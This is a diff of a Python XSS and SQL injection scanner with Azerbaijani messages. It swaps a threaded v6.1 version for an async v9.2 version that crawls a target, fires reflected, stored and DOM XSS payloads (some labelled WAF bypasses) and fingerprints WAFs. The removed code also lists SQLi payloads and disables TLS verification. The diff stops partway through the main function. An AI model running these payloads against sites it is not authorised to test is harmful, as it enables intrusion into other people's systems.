@@ -1,327 +1,455 @@
 #!/usr/bin/env python3
-"""
-xssscannerpro v6.1 — Enterprise-Grade Precision XSS & SQLi Scanner
-Author: Elshan Mammadov
-LinkedIn: https://www.linkedin.com/in/elshanmammadoov/
-GitHub:   https://github.com/elshanmammadoov
-"""
-
-import sys
-import os
-import re
-import argparse
+import asyncio
+import aiohttp
+import aiohttp.cookiejar
 import urllib.parse
-import urllib.request
-import ssl
-import html
+import sys
+import re
+import hashlib
 import json
-import random
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import argparse
+from datetime import datetime
+from bs4 import BeautifulSoup
+from collections import OrderedDict
 
-# ─── COLORS ───────────────────────────────────────────────
 class C:
-    R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'
-    P='\033[95m'; C='\033[96m'; W='\033[97m'; D='\033[2m'
-    BOLD='\033[1m'; RST='\033[0m'
+    RED     = "\033[91m"
+    GREEN   = "\033[92m"
+    YELLOW  = "\033[93m"
+    CYAN    = "\033[96m"
+    MAGENTA = "\033[95m"
+    WHITE   = "\033[97m"
+    DIM     = "\033[2m"
+    BOLD    = "\033[1m"
+    RESET   = "\033[0m"
 
-# ─── BANNER ───────────────────────────────────────────────
-BANNER = f"""{C.C}{C.BOLD}
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   ██╗  ██╗███████╗███████╗███████╗ ██████╗ █████╗ ███╗    ██╗    ║
-║   ╚████╔╝██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗████╗   ██║    ║
-║    ╚███╔╝ ███████╗███████╗███████╗██║     ███████║██╔██╗  ██║    ║
-║    ██╔██╗ ╚════██║╚════██║╚════██║██║     ██╔══██║██║╚██╗ ██║    ║
-║   ██╔╝ ██╗███████║███████║███████║╚██████╗██║  ██║██║ ╚████║    ║
-║   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ║
-║                                                              ║
-║    {C.G}PRO v6.1{C.C} ─ {C.W}Enterprise XSS, SQLi & WAF-Bypass Scanner{C.C}  ║
-║                                                              ║
-║    {C.D}Author : Elshan Mammadov{C.C}                               ║
-║    {C.D}In     : https://www.linkedin.com/in/elshanmammadoov/{C.C}   ║
-║    {C.D}GitHub : https://github.com/elshanmammadoov{C.C}            ║
-╚══════════════════════════════════════════════════════════════╝{C.RST}
-"""
+class Payloads:
+    REFLECTED = OrderedDict([
+        ("html_body_tag",    '<script>window.__xss_p1="INJECTED_{uid}";</script>'),
+        ("html_body_img",    '<img src=x onerror="window.__xss_p2=\'INJECTED_{uid}\'">'),
+        ("html_body_svg",    '<svg onload="window.__xss_p3=String.fromCharCode(73,78,74,69,67,84,69,68,95,117,105,100)">'),
+        ("html_body_body",   '<body onload="window.__xss_p4=\'INJECTED_{uid}\'">'),
+        ("html_body_details", '<details open ontoggle="window.__xss_p5=\'INJECTED_{uid}\'">'),
+        ("attr_js_handler",  '" onfocus="window.__xss_p6=\'INJECTED_{uid}\'" autofocus='),
+        ("attr_onerror",     '" onerror="window.__xss_p7=\'INJECTED_{uid}\'" src=x'),
+        ("attr_onmouseover", '" onmouseover="window.__xss_p8=\'INJECTED_{uid}\'" href=x'),
+        ("js_string_single", "';window.__xss_p9='INJECTED_{uid}';//"),
+        ("js_string_double", '";window.__xss_p10="INJECTED_{uid}";//'),
+        ("js_backtick",      '` ;window.__xss_p11="INJECTED_{uid}";//'),
+        ("html_entity_pct",  '%3Cscript%3Ewindow.__xss_p12%3D%27INJECTED_{uid}%27%3C%2Fscript%3E'),
+        ("html_entity_hex",  '&#x3C;script&#x3E;window.__xss_p13&#x3D;&#x27;INJECTED_{uid}&#x27;&#x3C;&#x2F;script&#x3E;'),
+        ("wav_bypass1",      '<img/src=x onerror=window.__xss_p15="INJECTED_{uid}">'),
+        ("wav_bypass2",      '<svg/onload=window.__xss_p16="INJECTED_{uid}">'),
+        ("direct_alert_tag", '"><script>alert(1)</script>'),
+        ("direct_alert_img", '"><img src=x onerror=alert(1)>'),
+        ("direct_alert_svg", '"><svg onload=alert(1)>'),
+        ("direct_alert_attr", '" autofocus onfocus="alert(1)')
+    ])
 
-# ─── PAYLOADS & ROTATORS ──────────────────────────────────
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
-]
+    STORED = OrderedDict([
+        ("stored_breakout1", '"><script>window.__xss_s1="STORED_{uid}";</script>'),
+        ("stored_breakout2", '"><img src=x onerror="window.__xss_s2=\'STORED_{uid}\'">'),
+        ("stored_breakout3", '\'><svg onload="window.__xss_s3=\'STORED_{uid}\'">'),
+        ("stored_breakout4", '" autofocus onfocus="window.__xss_s4=\'STORED_{uid}\''),
+    ])
 
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert('XSS')>",
-    "<svg onload=alert(1)>",
-    "\" onmouseover=alert(1) x=\"",
-    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
-    "<ScRiPt>alert(1)</sCrIpT>"
-]
+    DOM_BASED = OrderedDict([
+        ("dom_hash",         "javascript:window.__xss_d1=document.location.hash"),
+        ("dom_referrer",     "javascript:window.__xss_d2=document.referrer"),
+        ("dom_location",     "javascript:window.__xss_d3=document.location"),
+    ])
 
-SQLI_ERRORS = [
-    ("sql syntax", "MySQL / Generic SQL Syntax Error"),
-    ("mysql_fetch", "MySQL Function Error"),
-    ("syntax error", "PostgreSQL / Generic Syntax Error"),
-    ("unclosed quotation mark", "Microsoft SQL Server Error"),
-    ("odbc_", "ODBC Driver Error"),
-    ("sqlite3.operationalerror", "SQLite Database Error"),
-    ("pg_query", "PostgreSQL Query Error"),
-    ("ora-", "Oracle Database Error"),
-    ("syntax error in string", "MS Access SQL Error")
-]
-
-SQLI_PAYLOADS = [
-    "'", "\"", "''", "\\",
-    "' OR '1'='1", "\" OR \"1\"=\"1",
-    "' AND 1=1 -- ", "' AND 1=2 -- ",
-    "\" AND 1=1 -- ", "\" AND 1=2 -- ",
-    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"
-]
-
-# ─── SECURITY ANALYZER ────────────────────────────────────
-class SecurityAnalyzer:
     @staticmethod
-    def analyze_xss(response_text, payload):
-        findings = []
-        variants = [
-            ('raw', payload),
-            ('url_encoded', urllib.parse.quote(payload, safe='')),
-            ('html_encoded', html.escape(payload)),
+    def inject_uid(payload: str, uid: str) -> str:
+        return payload.replace("{uid}", uid)
+
+    @staticmethod
+    def get_detection_markers(uid: str) -> list:
+        return [
+            f'INJECTED_{uid}',
+            f'STORED_{uid}',
+            f'__xss_p',
+            f'__xss_s',
+            f'__xss_d',
         ]
-        
-        for variant_name, variant_payload in variants:
-            idx = response_text.find(variant_payload)
-            if idx == -1:
-                continue
-            
-            before = response_text[max(0, idx-150):idx]
-            script_matches = list(re.finditer(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE))
-            in_script = any(m.start() <= idx <= m.end() for m in script_matches)
-            
-            if in_script:
-                findings.append({'context': 'Script Tag', 'score': 9, 'reason': 'Payload inside <script> tag — executable'})
-            else:
-                last_tag_open = before.rfind('<')
-                last_tag_close = before.rfind('>')
-                if last_tag_close > last_tag_open:
-                    findings.append({'context': 'HTML Body', 'score': 8, 'reason': 'Payload reflected in HTML body'})
-        return findings
 
-    @staticmethod
-    def analyze_sqli(response_text):
-        text_lower = response_text.lower()
-        findings = []
-        for err_sig, err_desc in SQLI_ERRORS:
-            if err_sig in text_lower:
-                findings.append({
-                    'type': 'SQL Injection (Error-Based)',
-                    'score': 9,
-                    'reason': f"Database error detected in response: {err_desc}"
-                })
+class WAFDetector:
+    SIGNATURES = {
+        "Cloudflare":   [b"cf-ray", b"cf-cache-status", b"__cf_bm", b"cloudflare"],
+        "AWS WAF":     [b"aws-waf", b"x-amz-cf-id", b"waf-aws"],
+        "Akamai":      [b"akamai", b"akamai-x"],
+        "Sucuri":      [b"sucuri", b"x-sucuri-id"],
+        "Imperva":     [b"imperva", b"incapsula"],
+        "ModSecurity": [b"mod_security"],
+        "Custom WAF":  [b"waf", b"blocked", b"access denied", b"403 forbidden"],
+    }
+
+    @classmethod
+    def detect(cls, response_headers: dict, body: bytes) -> list:
+        detected = []
+        for waf_name, sigs in cls.SIGNATURES.items():
+            for sig in sigs:
+                for header_val in response_headers.values():
+                    if isinstance(header_val, bytes) and sig.lower() in header_val.lower():
+                        detected.append(waf_name)
+                        break
+                    elif isinstance(header_val, str) and sig.decode().lower() in header_val.lower():
+                        detected.append(waf_name)
+                        break
+                if sig.lower() in body.lower():
+                    if waf_name not in detected:
+                        detected.append(waf_name)
+        return list(set(detected))
+
+class FalsePositiveFilter:
+    @classmethod
+    def filter_false_positives(cls, url: str, param: str, payload: str, html: str, marker: str) -> tuple:
+        if marker not in html:
+            return False, "Marker tapılmadı"
+
+        # Meta və ya kommentariya içindədirsə false positive say
+        meta_match = re.search(rf'<meta[^>]+content="[^"]*{re.escape(marker)}[^"]*"', html, re.IGNORECASE)
+        if meta_match:
+            return False, "False Positive: Payload meta tag içindədir"
+
+        comment_match = re.search(rf'<!--.*?{re.escape(marker)}.*?-->', html, re.DOTALL | re.IGNORECASE)
+        if comment_match:
+            return False, "False Positive: Payload HTML comment içindədir"
+
+        # Tamamilə HTML entity olaraq escape olunubsa
+        if '&quot;' in html or '&gt;' in html or '&lt;' in html:
+            encoded_check = payload.replace('"', '&quot;').replace('>', '&gt;').replace('<', '&lt;')
+            if encoded_check in html and marker not in html.replace(encoded_check, ''):
+                return False, "False Positive: Input HTML Entity olaraq escape olunub"
+
+        # Aktiv icra kontekstinin yoxlanılması (script və ya event handler)
+        is_executable = False
+        for event in ['onerror', 'onload', 'onfocus', 'ontoggle', 'onmouseover', 'onclick']:
+            if f'{event}=' in html.lower() and marker in html:
+                is_executable = True
                 break
-        return findings
+        
+        if '<script>' in html.lower() and marker in html:
+            is_executable = True
 
-# ─── ADVANCED HTTP ENGINE ─────────────────────────────────
-class HTTPEngine:
-    def __init__(self):
-        self.ctx = ssl.create_default_context()
-        self.ctx.check_hostname = False
-        self.ctx.verify_mode = ssl.CERT_NONE
-    
-    def request(self, url, payload="", method="GET", post_data=None):
+        if not is_executable:
+            return False, "False Positive: Aktiv icra konteksti (script/event) tapılmadı"
+
+        return True, "100% Təsdiqlənmiş XSS Zəifliyi"
+
+class SmartCrawler:
+    def __init__(self, session: aiohttp.ClientSession, base_url: str, max_depth: int = 2, max_pages: int = 30):
+        self.session = session
+        self.base_url = base_url
+        self.max_depth = max_depth
+        self.max_pages = max_pages
+        self.visited = set()
+        self.endpoints = []
+        self.forms = []
+        self.parsed_base = urllib.parse.urlparse(base_url)
+
+    async def crawl(self):
+        await self._crawl_recursive(self.base_url, depth=0)
+        return self.endpoints, self.forms
+
+    async def _crawl_recursive(self, url: str, depth: int):
+        if depth > self.max_depth or len(self.visited) >= self.max_pages:
+            return
+        if url in self.visited:
+            return
+        self.visited.add(url)
+
         try:
-            headers = {
-                'User-Agent': random.choice(USER_AGENTS),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Connection': 'close',
-            }
-            
-            test_url = url
-            encoded_data = None
-
-            if method == "GET":
-                if payload:
-                    parsed = urllib.parse.urlparse(url)
-                    params = urllib.parse.parse_qs(parsed.query)
-                    if params:
-                        for key in params:
-                            params[key] = [payload]
-                        new_query = urllib.parse.urlencode(params, doseq=True)
-                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-                    else:
-                        sep = '&' if '?' in url else '?'
-                        test_url = f"{url}{sep}test={urllib.parse.quote(payload, safe='')}"
-            elif method == "POST":
-                if post_data:
-                    parsed_data = urllib.parse.parse_qs(post_data)
-                    for key in parsed_data:
-                        parsed_data[key] = [payload]
-                    encoded_data = urllib.parse.urlencode(parsed_data, doseq=True).encode('utf-8')
-                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
-
-            req = urllib.request.Request(
-                test_url, 
-                data=encoded_data if method == "POST" else None, 
-                headers=headers, 
-                method=method
-            )
-            
-            with urllib.request.urlopen(req, timeout=12, context=self.ctx) as resp:
-                body = resp.read().decode('utf-8', errors='ignore')
-                return body, resp.status
-        except urllib.error.HTTPError as e:
-            body = e.read().decode('utf-8', errors='ignore') if e.fp else ""
-            return body, e.code
+            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as resp:
+                if resp.status != 200:
+                    return
+                content_type = resp.headers.get('Content-Type', '')
+                if 'text/html' not in content_type:
+                    return
+                body = await resp.text()
         except Exception:
-            return None, None
-
-# ─── MAIN SCANNER ─────────────────────────────────────────
-class XSSScannerPro:
-    def __init__(self, threads=15, method="GET", post_data=None, output=None):
-        self.http = HTTPEngine()
-        self.analyzer = SecurityAnalyzer()
-        self.vulnerabilities = []
-        self.threads = threads
-        self.method = method.upper()
-        self.post_data = post_data
-        self.output = output
-    
-    def log(self, msg, level='info'):
-        symbols = {'info': '[i]', 'vuln': '[!]', 'ok': '[+]', 'warn': '[?]', 'scan': '[*]'}
-        colors = {'info': C.B, 'vuln': C.R+C.BOLD, 'ok': C.G, 'warn': C.Y, 'scan': C.C}
-        print(f"{colors.get(level, C.W)}{symbols.get(level, '[*]')} {msg}{C.RST}")
-    
-    def validate_url(self, url):
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        parsed = urllib.parse.urlparse(url)
-        return url if parsed.netloc and '.' in parsed.netloc else None
-    
-    def scan_target(self, target_url):
-        target_url = self.validate_url(target_url)
-        if not target_url:
-            self.log("Yanlış URL formatı!", 'vuln')
             return
-        
-        self.log(f"Hədəf: {target_url} [{self.method}]", 'scan')
-        self.log("Hədəfə qoşulma və WAF yoxlanılır...", 'info')
-        baseline_body, status = self.http.request(target_url, method=self.method, post_data=self.post_data)
-        
-        if baseline_body is None:
-            self.log("Qoşulma uğursuz oldu və ya hədəf blokladı!", 'vuln')
-            return
-        
-        self.log(f"Hədəf aktiv — HTTP {status}", 'ok')
-        print()
 
-        # Phase 1: XSS Scan
-        self.log("MƏRHƏLƏ 1: XSS Skaneri (Paralel & WAF Bypass)", 'scan')
-        self.run_concurrent_tests(target_url, XSS_PAYLOADS, 'XSS')
+        soup = BeautifulSoup(body, 'html.parser')
 
-        # Phase 2: SQLi Scan
-        print()
-        self.log("MƏRHƏLƏ 2: SQL Injection Skaneri (Error-Based)", 'scan')
-        self.run_concurrent_tests(target_url, SQLI_PAYLOADS, 'SQLI')
+        for a_tag in soup.find_all('a', href=True):
+            href = a_tag['href']
+            full = urllib.parse.urljoin(url, href)
+            parsed = urllib.parse.urlparse(full)
+            if parsed.netloc != self.parsed_base.netloc:
+                continue
+            if parsed.query:
+                params = urllib.parse.parse_qs(parsed.query)
+                self.endpoints.append((full, 'GET', params))
+            if depth < self.max_depth - 1:
+                asyncio.create_task(self._crawl_recursive(full, depth + 1))
 
-        self.print_report(target_url)
+        for form in soup.find_all('form'):
+            action = form.get('action', '')
+            form_url = urllib.parse.urljoin(url, action)
+            method = (form.get('method') or 'get').upper()
+            fields = {}
+            for inp in form.find_all(['input', 'textarea', 'select']):
+                name = inp.get('name')
+                if not name:
+                    continue
+                input_type = inp.get('type', 'text').lower()
+                if input_type in ('submit', 'image', 'button', 'reset'):
+                    continue
+                fields[name] = 'TEST_VALUE'
+            if fields:
+                self.forms.append((form_url, method, fields))
 
-    def _test_payload(self, url, param_name, payload, scan_type):
-        body, status = self.http.request(url, payload, method=self.method, post_data=self.post_data)
-        if not body:
-            return {'status': 'safe'}
-            
-        if scan_type == 'XSS':
-            findings = self.analyzer.analyze_xss(body, payload)
-            for f in findings:
-                if f['score'] >= 7:
-                    return {'status': 'vuln', 'type': 'Reflected XSS', 'param': param_name, 'payload': payload, 'reason': f['reason']}
-        elif scan_type == 'SQLI':
-            findings = self.analyzer.analyze_sqli(body)
-            for f in findings:
-                return {'status': 'vuln', 'type': f['type'], 'param': param_name, 'payload': payload, 'reason': f['reason']}
-        return {'status': 'safe'}
+    async def discover_endpoints_from_forms(self):
+        for form_url, method, fields in self.forms:
+            if method == 'GET':
+                query = urllib.parse.urlencode(fields, doseq=True)
+                full = f"{form_url}?{query}"
+                parsed = urllib.parse.urlparse(full)
+                params = urllib.parse.parse_qs(parsed.query)
+                self.endpoints.append((full, 'GET', params))
 
-    def run_concurrent_tests(self, url, payloads, scan_type):
-        if self.method == "GET":
-            parsed = urllib.parse.urlparse(url)
-            params = urllib.parse.parse_qs(parsed.query)
-            if not params:
-                params = {'id': '1', 'search': 'test', 'q': 'test'}
-        else:
-            params = urllib.parse.parse_qs(self.post_data) if self.post_data else {'username': 'test'}
-            
-        tasks = [(p_name, pay) for p_name in params for pay in payloads]
-        completed = 0
-        total = len(tasks)
-        bar_length = 30
-        
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            future_to_task = {
-                executor.submit(self._test_payload, url, p_name, pay, scan_type): (p_name, pay)
-                for p_name, pay in tasks
-            }
-            
-            for future in as_completed(future_to_task):
-                completed += 1
-                try:
-                    res = future.result()
-                    if res['status'] == 'vuln':
-                        self.vulnerabilities.append(res)
-                        print(f"\n{C.R}[!]{C.RST} ZƏİFLİK TAPILDI! [{res['type']}] Param='{res['param']}' | Səbəb: {res['reason']}")
-                except Exception:
-                    pass
-                
-                percent = int((completed / total) * 100) if total > 0 else 100
-                filled = int(bar_length * completed // total) if total > 0 else bar_length
-                bar = '█' * filled + '-' * (bar_length - filled)
-                
-                sys.stdout.write(f"\r{C.C}[{bar}] {percent}% ({completed}/{total}){C.RST}")
-                sys.stdout.flush()
-        print()
+class XSSTester:
+    def __init__(self, session: aiohttp.ClientSession, target: str, concurrency: int = 12):
+        self.session = session
+        self.target = target
+        self.concurrency = concurrency
+        self.semaphore = asyncio.Semaphore(concurrency)
+        self.uid = hashlib.md5(f"{target}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
+        self.results = []
+        self.total_tests = 0
+        self.completed = 0
+        self.waf_detected = []
 
-    def print_report(self, target_url):
-        print(f"\n{C.BOLD}{'═' * 64}{C.RST}")
-        print(f"{C.BOLD}  YEKUN HESABAT (v6.1 PRO){C.RST}")
-        print(f"{C.BOLD}{'═' * 64}{C.RST}\n")
-        print(f"  Hədəf URL     : {C.Y}{target_url}{C.RST}")
-        print(f"  Tapılan Zəiflik: {C.R if self.vulnerabilities else C.G}{len(self.vulnerabilities)}{C.RST}\n")
-        
-        for idx, v in enumerate(self.vulnerabilities, 1):
-            print(f"  {C.R}#{idx} Növ: {v['type']} | Parametr: {v['param']} | Payload: {v['payload']}{C.RST}")
+    async def scan(self):
+        await self._detect_waf()
+        print(f"{C.CYAN}[*] Smart Crawler işləyir — səhifələr toplanır...{C.RESET}")
+        crawler = SmartCrawler(self.session, self.target, max_depth=2, max_pages=30)
+        endpoints, forms = await crawler.crawl()
+        await crawler.discover_endpoints_from_forms()
 
-        if self.output and self.vulnerabilities:
+        if not endpoints and not forms:
+            print(f"{C.YELLOW}[!] Parametr və ya forma tapılmadı, birbaşa hədəfin özü yoxlanılır...{C.RESET}")
+            parsed_target = urllib.parse.urlparse(self.target)
+            if parsed_target.query:
+                endpoints.append((self.target, 'GET', urllib.parse.parse_qs(parsed_target.query)))
+            else:
+                endpoints.append((self.target, 'GET', {'q': 'TEST'}))
+
+        print(f"{C.GREEN}[+] {len(endpoints)} endpoint və {len(forms)} forma analiz üçün hazırdır.{C.RESET}")
+
+        print(f"{C.CYAN}[*] MƏRHƏLƏ 1: Reflected XSS Skanı{C.RESET}")
+        get_tasks = []
+        for url, method, params in endpoints:
+            for param_name in params:
+                for ptype, payload_template in Payloads.REFLECTED.items():
+                    payload = Payloads.inject_uid(payload_template, self.uid)
+                    get_tasks.append(self._test_get(url, param_name, payload, ptype, 'REFLECTED'))
+
+        print(f"{C.CYAN}[*] MƏRHƏLƏ 2: Stored / Form XSS Skanı{C.RESET}")
+        stored_tasks = []
+        for form_url, method, fields in forms:
+            for field_name in fields:
+                for ptype, payload_template in Payloads.STORED.items():
+                    payload = Payloads.inject_uid(payload_template, self.uid)
+                    stored_tasks.append(self._test_form(form_url, method, field_name, payload, ptype, 'STORED'))
+
+        print(f"{C.CYAN}[*] MƏRHƏLƏ 3: DOM-based XSS Skanı{C.RESET}")
+        dom_tasks = []
+        for url, method, params in endpoints:
+            for ptype, payload_template in Payloads.DOM_BASED.items():
+                payload = Payloads.inject_uid(payload_template, self.uid)
+                dom_tasks.append(self._test_dom(url, payload, ptype))
+
+        all_tasks = get_tasks + stored_tasks + dom_tasks
+        self.total_tests = len(all_tasks)
+        print(f"{C.CYAN}[*] Cəmi {self.total_tests} hücum vektoru yoxlanılır...{C.RESET}\n")
+
+        print_progress(0, self.total_tests)
+        for coro in asyncio.as_completed(all_tasks):
+            result = await coro
+            if result:
+                self.results.append(result)
+            self.completed += 1
+            if self.completed % 5 == 0 or self.completed == self.total_tests:
+                print_progress(self.completed, self.total_tests)
+
+    async def _detect_waf(self):
+        try:
+            async with self.session.get(self.target, timeout=8) as resp:
+                body = await resp.read()
+                self.waf_detected = WAFDetector.detect(dict(resp.headers), body)
+                if self.waf_detected:
+                    print(f"{C.YELLOW}[!] WAF/CMS aşkarlandı: {', '.join(self.waf_detected)}{C.RESET}")
+        except Exception:
+            pass
+
+    async def _test_get(self, url: str, param: str, payload: str, ptype: str, xss_type: str):
+        async with self.semaphore:
             try:
-                with open(self.output, 'w', encoding='utf-8') as f:
-                    json.dump(self.vulnerabilities, f, indent=4, ensure_ascii=False)
-                self.log(f"Hesabat uğurla yadda saxlandı: {self.output}", 'ok')
-            except Exception as e:
-                self.log(f"Fayla yazılarkən xəta: {e}", 'warn')
+                parsed = urllib.parse.urlparse(url)
+                qparams = urllib.parse.parse_qs(parsed.query)
+                qparams[param] = [payload]
+                new_query = urllib.parse.urlencode(qparams, doseq=True)
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
 
-def main():
-    parser = argparse.ArgumentParser(description="xssscannerpro v6.1 - Advanced Security Scanner")
-    parser.add_argument("url", nargs="?", help="Hədəf URL")
-    parser.add_argument("-t", "--threads", type=int, default=15, help="Thread sayı")
-    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP Sorğu metodu")
-    parser.add_argument("--data", help="POST məlumatları (məsələn: 'user=admin&pass=123')")
-    parser.add_argument("-o", "--output", help="Nəticələri JSON faylına yaz (məsələn: report.json)")
+                async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
+                    body = await resp.text()
+
+                for marker in Payloads.get_detection_markers(self.uid):
+                    valid, reason = FalsePositiveFilter.filter_false_positives(test_url, param, payload, body, marker)
+                    if valid:
+                        return {
+                            'type': xss_type, 'url': test_url, 'param': param,
+                            'payload': payload, 'payload_type': ptype, 'method': 'GET',
+                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
+                        }
+            except Exception:
+                pass
+            return None
+
+    async def _test_form(self, url: str, method: str, field: str, payload: str, ptype: str, xss_type: str):
+        async with self.semaphore:
+            try:
+                data = {field: payload}
+                if method == 'POST':
+                    async with self.session.post(url, data=data, timeout=8, allow_redirects=False) as resp:
+                        body = await resp.text()
+                else:
+                    new_query = urllib.parse.urlencode(data, doseq=True)
+                    test_url = f"{url}&{new_query}" if '?' in url else f"{url}?{new_query}"
+                    async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
+                        body = await resp.text()
+
+                for marker in Payloads.get_detection_markers(self.uid):
+                    valid, reason = FalsePositiveFilter.filter_false_positives(url, field, payload, body, marker)
+                    if valid:
+                        return {
+                            'type': xss_type, 'url': url, 'param': field,
+                            'payload': payload, 'payload_type': ptype, 'method': method,
+                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
+                        }
+            except Exception:
+                pass
+            return None
+
+    async def _test_dom(self, url: str, payload: str, ptype: str):
+        async with self.semaphore:
+            try:
+                test_url = f"{url}#{payload}"
+                async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
+                    body = await resp.text()
+
+                for marker in Payloads.get_detection_markers(self.uid):
+                    valid, reason = FalsePositiveFilter.filter_false_positives(test_url, 'fragment', payload, body, marker)
+                    if valid:
+                        return {
+                            'type': 'DOM-BASED', 'url': test_url, 'param': '#fragment',
+                            'payload': payload, 'payload_type': ptype, 'method': 'GET (fragment)',
+                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
+                        }
+            except Exception:
+                pass
+            return None
+
+class Reporter:
+    def __init__(self, results: list, target: str, waf: list):
+        self.results = results
+        self.target = target
+        self.waf = waf
+
+    def print_report(self):
+        print(f"\n{'='*60}")
+        print(f"{C.BOLD}{C.CYAN}    XSS SCAN NƏTİCƏLƏRİ (v9.2 PRO)    {C.RESET}")
+        print(f"  Hədəf      : {self.target}")
+        print(f"  Vaxt       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        if self.waf:
+            print(f"  WAF/CMS    : {', '.join(self.waf)}")
+        print(f"  Nəticə     : {len(self.results)} zəiflik aşkarlandı\n")
+
+        if not self.results:
+            print(f"  {C.GREEN}[✓] Heç bir XSS zəifliyi tapılmadı (Təhlükəsizdir).{C.RESET}\n")
+            return
+
+        for i, r in enumerate(self.results, 1):
+            print(f"  {C.RED}[{i}] {r['type']} XSS{C.RESET}")
+            print(f"      Parametr : {C.WHITE}{r['param']}{C.RESET}")
+            print(f"      URL      : {C.DIM}{r['url']}{C.RESET}")
+            print(f"      Payload  : {C.YELLOW}{r['payload']}{C.RESET}")
+            print(f"      Status   : {C.GREEN}{r['reason']}{C.RESET}")
+            print()
+        print(f"{'='*60}")
+
+    def save_json(self, filename: str):
+        report = {'target': self.target, 'timestamp': datetime.now().isoformat(), 'vulnerabilities': self.results}
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(report, f, indent=2, ensure_ascii=False)
+        print(f"{C.GREEN}[+] JSON hesabat yadda saxlanıldı: {filename}{C.RESET}")
+
+def print_progress(iteration: int, total: int):
+    if total == 0:
+        return
+    pct = 100.0 * iteration / total
+    filled = int(40 * iteration // total)
+    bar = '█' * filled + '░' * (40 - filled)
+    sys.stdout.write(f'\r  {C.CYAN}Skan: |{bar}| {pct:.1f}% ({iteration}/{total}){C.RESET}')
+    sys.stdout.flush()
+    if iteration == total:
+        print()
+
+def print_banner():
+    banner = f"""{C.CYAN}{C.BOLD}
+    ██╗  ██╗███████╗███████╗███████╗███╗   ██╗███╗   ██╗███╗   ██╗███████╗██████╗ 
+    ╚██╗██╔╝██╔════╝██╔════╝██╔════╝████╗  ██║████╗  ██║████╗  ██║██╔════╝██╔══██╗
+     ╚███╔╝ ███████╗███████╗███████╗██╔██╗ ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+     ██╔██╗ ╚════██║╚════██║╚════██║██║╚██╗██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+    ██╔╝ ██╗███████║███████║███████║██║ ╚████║██║ ╚████║██║ ╚████║███████╗██║  ██║
+    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+                                    PRO v9.2 (Enterprise XSS Engine)
+    {C.RESET}"""
+    print(banner)
+    print(f"  {C.CYAN}Author   : Elshan Mammadov{C.RESET}")
+    print(f"  {C.CYAN}GitHub   : github.com/elshanmammadoov{C.RESET}")
+    print(f"  {C.CYAN}LinkedIn : linkedin.com/in/elshanmammadoov{C.RESET}")
+    print(f"  {C.CYAN}──────────────────────────────────────────────────────────────────────────────────────{C.RESET}")
+
+async def main():
+    print_banner()
+    parser = argparse.ArgumentParser(description="XSS Scanner PRO v9.2")
+    parser.add_argument('target', nargs='?', help='Hədəf URL')
+    parser.add_argument('--json', type=str, default=None, help='JSON faylına yaz')
     args = parser.parse_args()
-    
-    # Əvvəlcə Banner çap olunur
-    print(BANNER)
-    
-    target_url = args.url
-    if not target_url:
-        target_url = input(f"{C.G}[?] Hədəf URL daxil edin: {C.RST}").strip()
-    
-    scanner = XSSScannerPro(threads=args.threads, method=args.method, post_data=args.data, output=args.output)
-    scanner.scan_target(target_url)
+
+    target = args.target if args.target else input(f"{C.CYAN}[?] Hədəf URL daxil edin: {C.RESET}").strip()
+    if not target:
+        print(f"{C.RED}[-] Hədəf daxil edilmədi!{C.RESET}")
+        return
+
+    if not target.startswith("http://") and not target.startswith("https://"):
+        target = "https://" + target
+
+    connector = aiohttp.TCPConnector(limit=12, limit_per_host=6)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        print(f"\n{C.CYAN}[*] Hədəfə qoşulma yoxlanılır...{C.RESET}")
+        try:
+            async with session.get(target, timeout=10, allow_redirects=True) as resp:
+                print(f"{C.GREEN}[+] Hədəf aktiv — HTTP {resp.status}{C.RESET}")
+        except Exception as e:
+            print(f"{C.RED}[-] Xəta: {e}{C.RESET}")
+            return
+
